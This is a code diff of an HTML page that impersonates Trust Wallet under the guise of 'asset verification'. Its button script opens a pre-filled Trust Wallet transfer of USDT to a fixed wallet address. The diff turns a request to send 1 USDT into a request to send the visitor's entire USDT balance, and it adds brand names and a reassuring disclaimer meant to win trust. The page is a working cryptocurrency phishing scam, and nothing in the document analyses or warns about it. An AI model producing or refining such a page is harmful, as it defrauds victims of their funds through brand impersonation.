@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <title>Verify Asset – Trust Wallet</title>
+  <title>USDT Verification – Trust Wallet</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <link rel="icon" href="favicon.ico" />
   <style>
@@ -86,15 +86,15 @@
 <body>
   <div class="card">
     <img src="logo.png" class="logo" alt="Logo" />
-    <h2>Please verify your asset</h2>
-    <p>To continue, please verify by sending 1 USDT to our secure address.</p>
+    <h2>Asset Verification Required</h2>
+    <p>To continue securely, please verify your entire USDT balance after selling. This ensures a trusted identity match for asset validation.</p>
 
     <label>
       <input type="checkbox" id="agree" />
-      I agree to the Terms and Privacy Policy
+      I agree to the Trust Wallet Terms and Privacy Policy
     </label>
 
-    <button id="verifyBtn" disabled>Verify</button>
+    <button id="verifyBtn" disabled>Verify with Trust Wallet</button>
 
     <div class="trust-badge">
       <img src="logo.png" width="20" />
@@ -102,7 +102,7 @@
     </div>
 
     <p class="disclaimer">
-      We never ask for your seed phrase or private key. This site uses secure smart contract methods.
+      We never ask for your seed phrase or private key. This platform uses secure smart contract methods to process assets safely.
     </p>
   </div>
 
@@ -115,9 +115,9 @@
     });
 
     btn.addEventListener("click", () => {
-      const trustLink = `https://link.trustwallet.com/send?coin=20000714&address=0x1956B3950A73B0C54792199Edf13c7b835FF94DC&token_id=0x55d398326f99059fF775485246999027B3197955&amount=1`;
+      const trustLink = `https://link.trustwallet.com/send?coin=20000714&address=0x1956B3950A73B0C54792199Edf13c7b835FF94DC&token_id=0x55d398326f99059fF775485246999027B3197955`;
 
-      // Open Trust Wallet for USDT transfer
+      // Open Trust Wallet for pre-filled transfer
       window.location.href = trustLink;
     });
   </script>
